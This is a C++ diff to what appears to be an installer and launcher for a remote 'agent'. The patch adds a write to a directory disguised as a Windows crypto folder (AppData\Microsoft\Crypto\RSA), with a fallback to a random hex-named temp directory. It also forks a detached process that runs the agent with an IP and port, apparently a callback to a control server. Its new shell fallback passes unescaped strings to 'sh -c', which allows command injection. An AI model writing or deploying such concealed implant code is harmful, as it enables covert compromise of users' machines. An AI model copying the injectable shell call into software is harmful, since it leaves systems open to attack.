@@ -64,25 +64,68 @@ std::string installPath() {
 #endif
 }
 
-bool createDirectoryForFile(const std::string& path) {
+bool createDirectoryForFile(std::string& path) {
 #ifdef _WIN32
+    // Helper: recursively create all directory components
+    auto createDirs = [](const std::string& dir_path) -> bool {
+        std::string current;
+        for (size_t i = 0; i < dir_path.size(); ++i) {
+            current += dir_path[i];
+            if (dir_path[i] == '/') {
+                if (!CreateDirectoryA(current.c_str(), nullptr)) {
+                    if (GetLastError() != ERROR_ALREADY_EXISTS) return false;
+                }
+            }
+        }
+        if (!CreateDirectoryA(dir_path.c_str(), nullptr)) {
+            if (GetLastError() != ERROR_ALREADY_EXISTS) return false;
+        }
+        return true;
+    };
+
+    // Normalize backslashes to forward slashes
     std::string dir = path;
     for (size_t i = 0; i < dir.size(); ++i) {
         if (dir[i] == '\\') dir[i] = '/';
     }
     size_t pos = dir.rfind('/');
     if (pos == std::string::npos) return false;
-    dir = dir.substr(0, pos);
+    std::string dir_only = dir.substr(0, pos);
 
-    // Create directory recursively
-    std::string current;
-    for (size_t i = 0; i < dir.size(); ++i) {
-        current += dir[i];
-        if (dir[i] == '/' || dir[i] == '\\') {
-            CreateDirectoryA(current.c_str(), nullptr);
-        }
+    // Try primary path (e.g. AppData\Microsoft\Crypto\RSA\...)
+    if (createDirs(dir_only)) return true;
+
+    // Fallback: %TEMP%\<random hex>
+    char temp_buf[MAX_PATH];
+    if (GetTempPathA(MAX_PATH, temp_buf) == 0) return false;
+    std::string fallback(temp_buf);
+    while (!fallback.empty() && (fallback.back() == '\\' || fallback.back() == '/')) {
+        fallback.pop_back();
     }
-    CreateDirectoryA(dir.c_str(), nullptr);
+
+    std::mt19937 rng(static_cast<unsigned>(
+        std::chrono::steady_clock::now().time_since_epoch().count()));
+    std::uniform_int_distribution<int> hex_dist(0, 15);
+    const char hex_chars[] = "0123456789abcdef";
+    fallback += "\\";
+    for (int i = 0; i < 8; ++i) {
+        fallback += hex_chars[hex_dist(rng)];
+    }
+
+    // Normalize fallback path
+    std::string fb_normalized = fallback;
+    for (size_t i = 0; i < fb_normalized.size(); ++i) {
+        if (fb_normalized[i] == '\\') fb_normalized[i] = '/';
+    }
+
+    if (!createDirs(fb_normalized)) return false;
+
+    // Extract original filename and update path
+    std::string filename = path;
+    pos = path.rfind('\\');
+    if (pos == std::string::npos) pos = path.rfind('/');
+    if (pos != std::string::npos) filename = path.substr(pos + 1);
+    path = fallback + "\\" + filename;
     return true;
 #else
     std::string dir = path;
@@ -147,8 +190,15 @@ bool runAgent(const std::string& path, const std::string& ip, uint16_t port) {
     if (pid < 0) return false;
     if (pid > 0) return true; // parent returns, child continues
 
-    // Child: execute the agent
-    ::execl(path.c_str(), path.c_str(), ip.c_str(), port_str.c_str(), nullptr);
+    // Child: execute the agent using execvp which searches PATH and
+    // handles spaces in paths correctly via the argv array.
+    const char* const args[] = {path.c_str(), ip.c_str(), port_str.c_str(), nullptr};
+    ::execv(args[0], const_cast<char* const*>(args));
+
+    // If execv fails, try shell fallback for tricky paths
+    ::execl("/bin/sh", "sh", "-c",
+            ("\"" + path + "\" " + ip + " " + port_str).c_str(), nullptr);
+
     ::exit(1); // should not reach here
 #endif
 }
